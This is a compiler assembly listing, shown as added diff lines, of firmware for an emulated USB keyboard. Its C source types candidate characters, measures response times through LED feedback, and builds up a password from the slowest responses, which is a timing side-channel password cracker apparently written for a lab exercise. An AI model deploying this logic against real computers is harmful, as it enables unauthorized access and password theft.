+ 944              		.loc 2 193 40 discriminator 2
+ 945 009a 012B     		cmp	r3, #1
+ 946 009c 07D8     		bhi	.L27
+ 947              	.L26:
+ 948              		.loc 2 193 63 discriminator 4
+ 949 009e 8C4B     		ldr	r3, .L41+32
+ 950 00a0 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 951 00a2 83F00103 		eor	r3, r3, #1
+ 952 00a6 DBB2     		uxtb	r3, r3
+ 953              		.loc 2 193 61 discriminator 4
+ 954 00a8 002B     		cmp	r3, #0
+ 955 00aa 00F07F81 		beq	.L24
+ 956              	.L27:
+ 194:main.c        **** 	
+ 195:main.c        **** 	
+ 196:main.c        **** 	
+ 197:main.c        **** response_time=millisec-sending_time;
+ 957              		.loc 2 197 23
+ 958 00ae 894B     		ldr	r3, .L41+36
+ 959 00b0 93ED007A 		vldr.32	s14, [r3]
+ 960 00b4 884B     		ldr	r3, .L41+40
+ 961 00b6 D3ED007A 		vldr.32	s15, [r3]
+ 962 00ba 77EE677A 		vsub.f32	s15, s14, s15
+ 963              		.loc 2 197 14
+ 964 00be 874B     		ldr	r3, .L41+44
+ 965 00c0 C3ED007A 		vstr.32	s15, [r3]
+ 198:main.c        **** 
+ 199:main.c        **** 			
+ 200:main.c        **** 		if(max_found){
+ 966              		.loc 2 200 6
+ 967 00c4 864B     		ldr	r3, .L41+48
+ 968 00c6 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 969              		.loc 2 200 5
+ 970 00c8 002B     		cmp	r3, #0
+ 971 00ca 44D0     		beq	.L28
+ 201:main.c        **** 
+ 202:main.c        **** 			iindex=maxI;
+ 972              		.loc 2 202 10
+ 973 00cc 854B     		ldr	r3, .L41+52
+ 974 00ce 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 975 00d0 854B     		ldr	r3, .L41+56
+ 976 00d2 1A70     		strb	r2, [r3]
+ 203:main.c        **** 			jindex=maxJ;
+ 977              		.loc 2 203 10
+ 978 00d4 854B     		ldr	r3, .L41+60
+ 979 00d6 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 980 00d8 854B     		ldr	r3, .L41+64
+ 981 00da 1A70     		strb	r2, [r3]
+ 204:main.c        **** 			pass[acc].code=keys[iindex].code;
+ 982              		.loc 2 204 31
+ 983 00dc 824B     		ldr	r3, .L41+56
+ 984 00de 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 985 00e0 1946     		mov	r1, r3
+ 986              		.loc 2 204 13
+ 987 00e2 844B     		ldr	r3, .L41+68
+ 988 00e4 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 989 00e6 1846     		mov	r0, r3
+ 990              		.loc 2 204 31
+ 991 00e8 834A     		ldr	r2, .L41+72
+ 992 00ea 0B46     		mov	r3, r1
+ 993 00ec 9B00     		lsls	r3, r3, #2
+ 994 00ee 0B44     		add	r3, r3, r1
+ 995 00f0 9B00     		lsls	r3, r3, #2
+ 996 00f2 1344     		add	r3, r3, r2
+ 997 00f4 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 998              		.loc 2 204 18
+ 999 00f6 814B     		ldr	r3, .L41+76
+ 1000 00f8 03F81020 		strb	r2, [r3, r0, lsl #1]
+ 205:main.c        **** 			pass[acc].modifier=keys[iindex].possible_modifiers[jindex];
+ 1001              		.loc 2 205 54
+ 1002 00fc 7A4B     		ldr	r3, .L41+56
+ 1003 00fe 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1004 0100 1946     		mov	r1, r3
+ 1005 0102 7B4B     		ldr	r3, .L41+64
+ 1006 0104 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1007 0106 1C46     		mov	r4, r3
+ 1008              		.loc 2 205 13
+ 1009 0108 7A4B     		ldr	r3, .L41+68
+ 1010 010a 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1011 010c 1846     		mov	r0, r3
+ 1012              		.loc 2 205 54
+ 1013 010e 7A4A     		ldr	r2, .L41+72
+ 1014 0110 0B46     		mov	r3, r1
+ 1015 0112 9B00     		lsls	r3, r3, #2
+ 1016 0114 0B44     		add	r3, r3, r1
+ 1017 0116 9B00     		lsls	r3, r3, #2
+ 1018 0118 1344     		add	r3, r3, r2
+ 1019 011a 2344     		add	r3, r3, r4
+ 1020 011c 0133     		adds	r3, r3, #1
+ 1021 011e 1978     		ldrb	r1, [r3]	@ zero_extendqisi2
+ 1022              		.loc 2 205 22
+ 1023 0120 764A     		ldr	r2, .L41+76
+ 1024 0122 4300     		lsls	r3, r0, #1
+ 1025 0124 1344     		add	r3, r3, r2
+ 1026 0126 0A46     		mov	r2, r1
+ 1027 0128 5A70     		strb	r2, [r3, #1]
+ 206:main.c        **** 			acc++;
+ 1028              		.loc 2 206 7
+ 1029 012a 724B     		ldr	r3, .L41+68
+ 1030 012c 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1031 012e 0133     		adds	r3, r3, #1
+ 1032 0130 DAB2     		uxtb	r2, r3
+ 1033 0132 704B     		ldr	r3, .L41+68
+ 1034 0134 1A70     		strb	r2, [r3]
+ 207:main.c        **** 			i=0; j=0;
+ 1035              		.loc 2 207 5
+ 1036 0136 634B     		ldr	r3, .L41+20
+ 1037 0138 0022     		movs	r2, #0
+ 1038 013a 1A70     		strb	r2, [r3]
+ 1039              		.loc 2 207 10
+ 1040 013c 704B     		ldr	r3, .L41+80
+ 1041 013e 0022     		movs	r2, #0
+ 1042 0140 1A70     		strb	r2, [r3]
+ 208:main.c        **** 			p=0;
+ 1043              		.loc 2 208 5
+ 1044 0142 704B     		ldr	r3, .L41+84
+ 1045 0144 0022     		movs	r2, #0
+ 1046 0146 1A70     		strb	r2, [r3]
+ 209:main.c        **** 			max_found=0;
+ 1047              		.loc 2 209 13
+ 1048 0148 654B     		ldr	r3, .L41+48
+ 1049 014a 0022     		movs	r2, #0
+ 1050 014c 1A70     		strb	r2, [r3]
+ 210:main.c        **** 			ready_to_Enter=3;
+ 1051              		.loc 2 210 18
+ 1052 014e 6E4B     		ldr	r3, .L41+88
+ 1053 0150 0322     		movs	r2, #3
+ 1054 0152 1A70     		strb	r2, [r3]
+ 1055 0154 52E0     		b	.L29
+ 1056              	.L28:
+ 211:main.c        **** 		}
+ 212:main.c        **** 		else if(feedback_received)
+ 1057              		.loc 2 212 11
+ 1058 0156 5C4B     		ldr	r3, .L41+24
+ 1059 0158 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1060              		.loc 2 212 10
+ 1061 015a 002B     		cmp	r3, #0
+ 1062 015c 4ED0     		beq	.L29
+ 213:main.c        **** 		{
+ 214:main.c        **** 			keys[i].time[j]=response_time;
+ 1063              		.loc 2 214 16
+ 1064 015e 594B     		ldr	r3, .L41+20
+ 1065 0160 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1066 0162 1846     		mov	r0, r3
+ 1067 0164 664B     		ldr	r3, .L41+80
+ 1068 0166 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1069 0168 1C46     		mov	r4, r3
+ 1070              		.loc 2 214 19
+ 1071 016a 5C4B     		ldr	r3, .L41+44
+ 1072 016c 1A68     		ldr	r2, [r3]	@ float
+ 1073 016e 6249     		ldr	r1, .L41+72
+ 1074 0170 0346     		mov	r3, r0
+ 1075 0172 9B00     		lsls	r3, r3, #2
+ 1076 0174 0344     		add	r3, r3, r0
+ 1077 0176 2344     		add	r3, r3, r4
+ 1078 0178 0233     		adds	r3, r3, #2
+ 1079 017a 9B00     		lsls	r3, r3, #2
+ 1080 017c 0B44     		add	r3, r3, r1
+ 1081 017e 1A60     		str	r2, [r3]	@ float
+ 215:main.c        **** 			if(i==43 && j==keys[i].number_of_modifiers-1) 
+ 1082              		.loc 2 215 8
+ 1083 0180 504B     		ldr	r3, .L41+20
+ 1084 0182 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1085              		.loc 2 215 6
+ 1086 0184 2B2B     		cmp	r3, #43
+ 1087 0186 15D1     		bne	.L30
+ 1088              		.loc 2 215 17 discriminator 1
+ 1089 0188 5D4B     		ldr	r3, .L41+80
+ 1090 018a 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1091 018c 1846     		mov	r0, r3
+ 1092              		.loc 2 215 26 discriminator 1
+ 1093 018e 4D4B     		ldr	r3, .L41+20
+ 1094 0190 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1095 0192 1946     		mov	r1, r3
+ 1096 0194 584A     		ldr	r2, .L41+72
+ 1097 0196 0B46     		mov	r3, r1
+ 1098 0198 9B00     		lsls	r3, r3, #2
+ 1099 019a 0B44     		add	r3, r3, r1
+ 1100 019c 9B00     		lsls	r3, r3, #2
+ 1101 019e 1344     		add	r3, r3, r2
+ 1102 01a0 0433     		adds	r3, r3, #4
+ 1103 01a2 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1104              		.loc 2 215 46 discriminator 1
+ 1105 01a4 013B     		subs	r3, r3, #1
+ 1106              		.loc 2 215 13 discriminator 1
+ 1107 01a6 9842     		cmp	r0, r3
+ 1108 01a8 04D1     		bne	.L30
+ 216:main.c        **** 		{
+ 217:main.c        **** 			getMaxResponse();
+ 1109              		.loc 2 217 4
+ 1110 01aa FFF7FEFF 		bl	getMaxResponse
+ 218:main.c        **** 			max_found=1;
+ 1111              		.loc 2 218 13
+ 1112 01ae 4C4B     		ldr	r3, .L41+48
+ 1113 01b0 0122     		movs	r2, #1
+ 1114 01b2 1A70     		strb	r2, [r3]
+ 1115              	.L30:
+ 219:main.c        **** 		}
+ 220:main.c        **** 
+ 221:main.c        **** 				j++;
+ 1116              		.loc 2 221 6
+ 1117 01b4 524B     		ldr	r3, .L41+80
+ 1118 01b6 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1119 01b8 0133     		adds	r3, r3, #1
+ 1120 01ba DAB2     		uxtb	r2, r3
+ 1121 01bc 504B     		ldr	r3, .L41+80
+ 1122 01be 1A70     		strb	r2, [r3]
+ 222:main.c        **** 				mReset=2;
+ 1123              		.loc 2 222 11
+ 1124 01c0 524B     		ldr	r3, .L41+92
+ 1125 01c2 0222     		movs	r2, #2
+ 1126 01c4 1A70     		strb	r2, [r3]
+ 223:main.c        **** 		if(j==keys[i].number_of_modifiers)
+ 1127              		.loc 2 223 16
+ 1128 01c6 3F4B     		ldr	r3, .L41+20
+ 1129 01c8 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1130 01ca 1946     		mov	r1, r3
+ 1131 01cc 4A4A     		ldr	r2, .L41+72
+ 1132 01ce 0B46     		mov	r3, r1
+ 1133 01d0 9B00     		lsls	r3, r3, #2
+ 1134 01d2 0B44     		add	r3, r3, r1
+ 1135 01d4 9B00     		lsls	r3, r3, #2
+ 1136 01d6 1344     		add	r3, r3, r2
+ 1137 01d8 0433     		adds	r3, r3, #4
+ 1138 01da 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 1139              		.loc 2 223 7
+ 1140 01dc 484B     		ldr	r3, .L41+80
+ 1141 01de 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1142              		.loc 2 223 5
+ 1143 01e0 9A42     		cmp	r2, r3
+ 1144 01e2 0BD1     		bne	.L29
+ 224:main.c        **** 			{
+ 225:main.c        **** 				i++;
+ 1145              		.loc 2 225 6
+ 1146 01e4 374B     		ldr	r3, .L41+20
+ 1147 01e6 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1148 01e8 0133     		adds	r3, r3, #1
+ 1149 01ea DAB2     		uxtb	r2, r3
+ 1150 01ec 354B     		ldr	r3, .L41+20
+ 1151 01ee 1A70     		strb	r2, [r3]
+ 226:main.c        **** 				j=0;
+ 1152              		.loc 2 226 6
+ 1153 01f0 434B     		ldr	r3, .L41+80
+ 1154 01f2 0022     		movs	r2, #0
+ 1155 01f4 1A70     		strb	r2, [r3]
+ 227:main.c        **** 				mReset=1;
+ 1156              		.loc 2 227 11
+ 1157 01f6 454B     		ldr	r3, .L41+92
+ 1158 01f8 0122     		movs	r2, #1
+ 1159 01fa 1A70     		strb	r2, [r3]
+ 1160              	.L29:
+ 228:main.c        **** 			}
+ 229:main.c        **** 
+ 230:main.c        **** 		}
+ 231:main.c        **** 
+ 232:main.c        **** 		
+ 233:main.c        **** 	if(ready_to_Enter==0 && i<45) {
+ 1161              		.loc 2 233 19
+ 1162 01fc 424B     		ldr	r3, .L41+88
+ 1163 01fe 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1164              		.loc 2 233 4
+ 1165 0200 002B     		cmp	r3, #0
+ 1166 0202 27D1     		bne	.L31
+ 1167              		.loc 2 233 27 discriminator 1
+ 1168 0204 2F4B     		ldr	r3, .L41+20
+ 1169 0206 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1170              		.loc 2 233 23 discriminator 1
+ 1171 0208 2C2B     		cmp	r3, #44
+ 1172 020a 23D8     		bhi	.L31
+ 234:main.c        **** 		x=keys[i].code;
+ 1173              		.loc 2 234 12
+ 1174 020c 2D4B     		ldr	r3, .L41+20
+ 1175 020e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1176 0210 1946     		mov	r1, r3
+ 1177 0212 394A     		ldr	r2, .L41+72
+ 1178 0214 0B46     		mov	r3, r1
+ 1179 0216 9B00     		lsls	r3, r3, #2
+ 1180 0218 0B44     		add	r3, r3, r1
+ 1181 021a 9B00     		lsls	r3, r3, #2
+ 1182 021c 1344     		add	r3, r3, r2
+ 1183 021e 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 1184              		.loc 2 234 4
+ 1185 0220 3B4B     		ldr	r3, .L41+96
+ 1186 0222 1A70     		strb	r2, [r3]
+ 235:main.c        **** 		y=keys[i].possible_modifiers[j];
+ 1187              		.loc 2 235 31
+ 1188 0224 274B     		ldr	r3, .L41+20
+ 1189 0226 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1190 0228 1946     		mov	r1, r3
+ 1191 022a 354B     		ldr	r3, .L41+80
+ 1192 022c 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1193 022e 1846     		mov	r0, r3
+ 1194 0230 314A     		ldr	r2, .L41+72
+ 1195 0232 0B46     		mov	r3, r1
+ 1196 0234 9B00     		lsls	r3, r3, #2
+ 1197 0236 0B44     		add	r3, r3, r1
+ 1198 0238 9B00     		lsls	r3, r3, #2
+ 1199 023a 1344     		add	r3, r3, r2
+ 1200 023c 0344     		add	r3, r3, r0
+ 1201 023e 0133     		adds	r3, r3, #1
+ 1202 0240 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 1203              		.loc 2 235 4
+ 1204 0242 344B     		ldr	r3, .L41+100
+ 1205 0244 1A70     		strb	r2, [r3]
+ 236:main.c        **** 	
+ 237:main.c        **** 		ready_to_Enter=2;
+ 1206              		.loc 2 237 17
+ 1207 0246 304B     		ldr	r3, .L41+88
+ 1208 0248 0222     		movs	r2, #2
+ 1209 024a 1A70     		strb	r2, [r3]
+ 238:main.c        **** 		sent=0;
+ 1210              		.loc 2 238 7
+ 1211 024c 204B     		ldr	r3, .L41+32
+ 1212 024e 0022     		movs	r2, #0
+ 1213 0250 1A70     		strb	r2, [r3]
+ 1214 0252 95E0     		b	.L32
+ 1215              	.L31:
+ 239:main.c        **** 		//p=0;
+ 240:main.c        **** 
+ 241:main.c        **** 	}
+ 242:main.c        **** 	else if (ready_to_Enter==1 && i<45 )
+ 1216              		.loc 2 242 25
+ 1217 0254 2C4B     		ldr	r3, .L41+88
+ 1218 0256 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1219              		.loc 2 242 10
+ 1220 0258 012B     		cmp	r3, #1
+ 1221 025a 18D1     		bne	.L33
+ 1222              		.loc 2 242 33 discriminator 1
+ 1223 025c 194B     		ldr	r3, .L41+20
+ 1224 025e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1225              		.loc 2 242 29 discriminator 1
+ 1226 0260 2C2B     		cmp	r3, #44
+ 1227 0262 14D8     		bhi	.L33
+ 243:main.c        **** 	{
+ 244:main.c        **** 		
+ 245:main.c        **** 		x=GERMAN_KEYBOARD_SC_ENTER;
+ 1228              		.loc 2 245 4
+ 1229 0264 2A4B     		ldr	r3, .L41+96
+ 1230 0266 2822     		movs	r2, #40
+ 1231 0268 1A70     		strb	r2, [r3]
+ 246:main.c        **** 		y=0;
+ 1232              		.loc 2 246 4
+ 1233 026a 2A4B     		ldr	r3, .L41+100
+ 1234 026c 0022     		movs	r2, #0
+ 1235 026e 1A70     		strb	r2, [r3]
+ 247:main.c        **** 		if (acc==0)ready_to_Enter=0;
+ 1236              		.loc 2 247 10
+ 1237 0270 204B     		ldr	r3, .L41+68
+ 1238 0272 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1239              		.loc 2 247 6
+ 1240 0274 002B     		cmp	r3, #0
+ 1241 0276 03D1     		bne	.L34
+ 1242              		.loc 2 247 28 discriminator 1
+ 1243 0278 234B     		ldr	r3, .L41+88
+ 1244 027a 0022     		movs	r2, #0
+ 1245 027c 1A70     		strb	r2, [r3]
+ 1246 027e 02E0     		b	.L35
+ 1247              	.L34:
+ 248:main.c        **** 		else ready_to_Enter=3;
+ 1248              		.loc 2 248 22
+ 1249 0280 214B     		ldr	r3, .L41+88
+ 1250 0282 0322     		movs	r2, #3
+ 1251 0284 1A70     		strb	r2, [r3]
+ 1252              	.L35:
+ 249:main.c        **** 		sent=1;
+ 1253              		.loc 2 249 7
+ 1254 0286 124B     		ldr	r3, .L41+32
+ 1255 0288 0122     		movs	r2, #1
+ 1256 028a 1A70     		strb	r2, [r3]
+ 1257 028c 78E0     		b	.L32
+ 1258              	.L33:
+ 250:main.c        **** 	}
+ 251:main.c        **** 	else if (ready_to_Enter==2)
+ 1259              		.loc 2 251 25
+ 1260 028e 1E4B     		ldr	r3, .L41+88
+ 1261 0290 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1262              		.loc 2 251 10
+ 1263 0292 022B     		cmp	r3, #2
+ 1264 0294 40D1     		bne	.L36
+ 252:main.c        **** 	{
+ 253:main.c        **** 		x=0;
+ 1265              		.loc 2 253 4
+ 1266 0296 1E4B     		ldr	r3, .L41+96
+ 1267 0298 0022     		movs	r2, #0
+ 1268 029a 1A70     		strb	r2, [r3]
+ 254:main.c        **** 		y=0;
+ 1269              		.loc 2 254 4
+ 1270 029c 1D4B     		ldr	r3, .L41+100
+ 1271 029e 0022     		movs	r2, #0
+ 1272 02a0 1A70     		strb	r2, [r3]
+ 255:main.c        **** 		//if(p==0) ready_to_Enter=1;
+ 256:main.c        **** 		//else ready_to_Enter=0;
+ 257:main.c        **** 		ready_to_Enter=1;
+ 1273              		.loc 2 257 17
+ 1274 02a2 194B     		ldr	r3, .L41+88
+ 1275 02a4 0122     		movs	r2, #1
+ 1276 02a6 1A70     		strb	r2, [r3]
+ 258:main.c        **** 		sent=0;
+ 1277              		.loc 2 258 7
+ 1278 02a8 094B     		ldr	r3, .L41+32
+ 1279 02aa 0022     		movs	r2, #0
+ 1280 02ac 1A70     		strb	r2, [r3]
+ 1281 02ae 67E0     		b	.L32
+ 1282              	.L42:
+ 1283              		.align	2
+ 1284              	.L41:
+ 1285 02b0 00000000 		.word	cracked
+ 1286 02b4 18000000 		.word	indexToSend.12605
+ 1287 02b8 19000000 		.word	characterSent.12604
+ 1288 02bc 70030000 		.word	CMD_mod.12616
+ 1289 02c0 8C030000 		.word	CMD_msg.12615
+ 1290 02c4 1A000000 		.word	i.12608
+ 1291 02c8 00000000 		.word	feedback_received
+ 1292 02cc 00000000 		.word	NUMLOCK_PRESSES
+ 1293 02d0 00000000 		.word	sent
+ 1294 02d4 00000000 		.word	millisec
+ 1295 02d8 00000000 		.word	sending_time
+ 1296 02dc 00000000 		.word	response_time
+ 1297 02e0 00000000 		.word	max_found
+ 1298 02e4 00000000 		.word	maxI
+ 1299 02e8 1B000000 		.word	iindex.12613
+ 1300 02ec 00000000 		.word	maxJ
+ 1301 02f0 1C000000 		.word	jindex.12614
+ 1302 02f4 1D000000 		.word	acc.12612
+ 1303 02f8 00000000 		.word	keys
+ 1304 02fc 20000000 		.word	pass.12607
+ 1305 0300 E8000000 		.word	j.12609
+ 1306 0304 00000000 		.word	p
+ 1307 0308 00000000 		.word	ready_to_Enter
+ 1308 030c 00000000 		.word	mReset
+ 1309 0310 E9000000 		.word	x.12610
+ 1310 0314 EA000000 		.word	y.12611
+ 1311              	.L36:
+ 259:main.c        **** 	}
+ 260:main.c        **** 	else if (ready_to_Enter==3)
+ 1312              		.loc 2 260 25
+ 1313 0318 274B     		ldr	r3, .L43
+ 1314 031a 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1315              		.loc 2 260 10
+ 1316 031c 032B     		cmp	r3, #3
+ 1317 031e 29D1     		bne	.L37
+ 261:main.c        **** 	{
+ 262:main.c        **** 		if(p<acc){
+ 1318              		.loc 2 262 7
+ 1319 0320 264B     		ldr	r3, .L43+4
+ 1320 0322 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 1321 0324 264B     		ldr	r3, .L43+8
+ 1322 0326 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1323              		.loc 2 262 5
+ 1324 0328 9A42     		cmp	r2, r3
+ 1325 032a 1CD2     		bcs	.L38
+ 263:main.c        **** 		x=pass[p].code;
+ 1326              		.loc 2 263 12
+ 1327 032c 234B     		ldr	r3, .L43+4
+ 1328 032e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1329 0330 1A46     		mov	r2, r3
+ 1330 0332 244B     		ldr	r3, .L43+12
+ 1331 0334 13F81220 		ldrb	r2, [r3, r2, lsl #1]	@ zero_extendqisi2
+ 1332              		.loc 2 263 4
+ 1333 0338 234B     		ldr	r3, .L43+16
+ 1334 033a 1A70     		strb	r2, [r3]
+ 264:main.c        **** 		y=pass[p].modifier;
+ 1335              		.loc 2 264 12
+ 1336 033c 1F4B     		ldr	r3, .L43+4
+ 1337 033e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1338 0340 204A     		ldr	r2, .L43+12
+ 1339 0342 5B00     		lsls	r3, r3, #1
+ 1340 0344 1344     		add	r3, r3, r2
+ 1341 0346 5A78     		ldrb	r2, [r3, #1]	@ zero_extendqisi2
+ 1342              		.loc 2 264 4
+ 1343 0348 204B     		ldr	r3, .L43+20
+ 1344 034a 1A70     		strb	r2, [r3]
+ 265:main.c        **** 		p++;
+ 1345              		.loc 2 265 4
+ 1346 034c 1B4B     		ldr	r3, .L43+4
+ 1347 034e 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1348 0350 0133     		adds	r3, r3, #1
+ 1349 0352 DAB2     		uxtb	r2, r3
+ 1350 0354 194B     		ldr	r3, .L43+4
+ 1351 0356 1A70     		strb	r2, [r3]
+ 266:main.c        **** 		ready_to_Enter=3;
+ 1352              		.loc 2 266 17
+ 1353 0358 174B     		ldr	r3, .L43
+ 1354 035a 0322     		movs	r2, #3
+ 1355 035c 1A70     		strb	r2, [r3]
+ 267:main.c        **** 		sent=0;
+ 1356              		.loc 2 267 7
+ 1357 035e 1C4B     		ldr	r3, .L43+24
+ 1358 0360 0022     		movs	r2, #0
+ 1359 0362 1A70     		strb	r2, [r3]
+ 1360 0364 0CE0     		b	.L32
+ 1361              	.L38:
+ 268:main.c        **** 		//mReset=3;
+ 269:main.c        **** 		}
+ 270:main.c        **** 		else 
+ 271:main.c        **** 		{
+ 272:main.c        **** 			ready_to_Enter=0;
+ 1362              		.loc 2 272 18
+ 1363 0366 144B     		ldr	r3, .L43
+ 1364 0368 0022     		movs	r2, #0
+ 1365 036a 1A70     		strb	r2, [r3]
+ 273:main.c        **** 			p=0;
+ 1366              		.loc 2 273 5
+ 1367 036c 134B     		ldr	r3, .L43+4
+ 1368 036e 0022     		movs	r2, #0
+ 1369 0370 1A70     		strb	r2, [r3]
+ 1370 0372 05E0     		b	.L32
+ 1371              	.L37:
+ 274:main.c        **** 		}
+ 275:main.c        **** 	
+ 276:main.c        **** 	}
+ 277:main.c        **** 	else
+ 278:main.c        **** 	{
+ 279:main.c        **** 		x=0;
+ 1372              		.loc 2 279 4
+ 1373 0374 144B     		ldr	r3, .L43+16
+ 1374 0376 0022     		movs	r2, #0
+ 1375 0378 1A70     		strb	r2, [r3]
+ 280:main.c        **** 		y=0;
+ 1376              		.loc 2 280 4
+ 1377 037a 144B     		ldr	r3, .L43+20
+ 1378 037c 0022     		movs	r2, #0
+ 1379 037e 1A70     		strb	r2, [r3]
+ 1380              	.L32:
+ 281:main.c        **** 
+ 282:main.c        **** 	}
+ 283:main.c        **** 	//}
+ 284:main.c        **** 
+ 285:main.c        **** //	static uint8_t stringToSend[2] = {GERMAN_KEYBOARD_SC_N, GERMAN_KEYBOARD_SC_ENTER};
+ 286:main.c        **** 
+ 287:main.c        **** 	
+ 288:main.c        **** 
+ 289:main.c        **** 			report->Modifier = y; 
+ 1381              		.loc 2 289 21
+ 1382 0380 124B     		ldr	r3, .L43+20
+ 1383 0382 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 1384 0384 7B69     		ldr	r3, [r7, #20]
+ 1385 0386 1A70     		strb	r2, [r3]
+ 290:main.c        **** 			report->Reserved = 0; 
+ 1386              		.loc 2 290 21
+ 1387 0388 7B69     		ldr	r3, [r7, #20]
+ 1388 038a 0022     		movs	r2, #0
+ 1389 038c 5A70     		strb	r2, [r3, #1]
+ 291:main.c        **** 			report->KeyCode[0] = x; 
+ 1390              		.loc 2 291 23
+ 1391 038e 0E4B     		ldr	r3, .L43+16
+ 1392 0390 1A78     		ldrb	r2, [r3]	@ zero_extendqisi2
+ 1393 0392 7B69     		ldr	r3, [r7, #20]
+ 1394 0394 9A70     		strb	r2, [r3, #2]
+ 292:main.c        **** 			//characterSent = 1;
+ 293:main.c        **** 			//ready_to_Enter=2;
+ 294:main.c        **** 	//	}
+ 295:main.c        **** 	
+ 296:main.c        **** 
+ 297:main.c        **** 	if(x==GERMAN_KEYBOARD_SC_ENTER) 
+ 1395              		.loc 2 297 6
+ 1396 0396 0C4B     		ldr	r3, .L43+16
+ 1397 0398 1B78     		ldrb	r3, [r3]	@ zero_extendqisi2
+ 1398              		.loc 2 297 4
+ 1399 039a 282B     		cmp	r3, #40
+ 1400 039c 03D1     		bne	.L39
+ 298:main.c        **** 	{
+ 299:main.c        **** 	//	sent=1;
+ 300:main.c        **** 	sending_time=millisec;
+ 1401              		.loc 2 300 14
+ 1402 039e 0D4B     		ldr	r3, .L43+28
+ 1403 03a0 1B68     		ldr	r3, [r3]	@ float
+ 1404 03a2 0D4A     		ldr	r2, .L43+32
+ 1405 03a4 1360     		str	r3, [r2]	@ float
+ 1406              	.L39:
+ 301:main.c        **** 	
+ 302:main.c        **** 	}
+ 303:main.c        **** 
+ 304:main.c        **** 		feedback_received=0;
+ 1407              		.loc 2 304 20
+ 1408 03a6 0D4B     		ldr	r3, .L43+36
+ 1409 03a8 0022     		movs	r2, #0
+ 1410 03aa 1A70     		strb	r2, [r3]
+ 1411              	.L24:
+ 305:main.c        **** 	
+ 306:main.c        **** 	}
+ 307:main.c        **** 
+ 308:main.c        **** 
+ 309:main.c        **** 	return true;
+ 1412              		.loc 2 309 9
+ 1413 03ac 0123     		movs	r3, #1
+ 310:main.c        **** }
+ 1414              		.loc 2 310 1
+ 1415 03ae 1846     		mov	r0, r3
+ 1416 03b0 1C37     		adds	r7, r7, #28
+ 1417              	.LCFI24:
+ 1418              		.cfi_def_cfa_offset 12
+ 1419 03b2 BD46     		mov	sp, r7
+ 1420              	.LCFI25:
+ 1421              		.cfi_def_cfa_register 13
+ 1422              		@ sp needed
+ 1423 03b4 90BD     		pop	{r4, r7, pc}
+ 1424              	.L44:
+ 1425 03b6 00BF     		.align	2
+ 1426              	.L43:
+ 1427 03b8 00000000 		.word	ready_to_Enter
+ 1428 03bc 00000000 		.word	p
+ 1429 03c0 1D000000 		.word	acc.12612
+ 1430 03c4 20000000 		.word	pass.12607
+ 1431 03c8 E9000000 		.word	x.12610
+ 1432 03cc EA000000 		.word	y.12611
+ 1433 03d0 00000000 		.word	sent
+ 1434 03d4 00000000 		.word	millisec
+ 1435 03d8 00000000 		.word	sending_time
+ 1436 03dc 00000000 		.word	feedback_received
+ 1437              		.cfi_endproc
+ 1438              	.LFE205:
+ 1440              		.section	.text.CALLBACK_HID_Device_ProcessHIDReport,"ax",%progbits
+ 1441              		.align	1
+ 1442              		.global	CALLBACK_HID_Device_ProcessHIDReport
+ 1443              		.syntax unified
+ 1444              		.thumb
+ 1445              		.thumb_func
+ 1446              		.fpu fpv4-sp-d16
+ 1448              	CALLBACK_HID_Device_ProcessHIDReport:
+ 1449              	.LFB206:
+ 311:main.c        **** 
+ 312:main.c        **** // Called on report input. For keyboard HID devices, that's the state of the LEDs
+ 313:main.c        **** void CALLBACK_HID_Device_ProcessHIDReport(
+ 314:main.c        **** 						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
+ 315:main.c        **** 						const uint8_t ReportID,
+ 316:main.c        **** 						const uint8_t ReportType,
+ 317:main.c        **** 						const void* ReportData,
+ 318:main.c        **** 						const uint16_t ReportSize ) {
+ 1450              		.loc 2 318 35
+ 1451              		.cfi_startproc
+ 1452              		@ args = 4, pretend = 0, frame = 24
+ 1453              		@ frame_needed = 1, uses_anonymous_args = 0
+ 1454 0000 80B5     		push	{r7, lr}
+ 1455              	.LCFI26:
+ 1456              		.cfi_def_cfa_offset 8
+ 1457              		.cfi_offset 7, -8
+ 1458              		.cfi_offset 14, -4
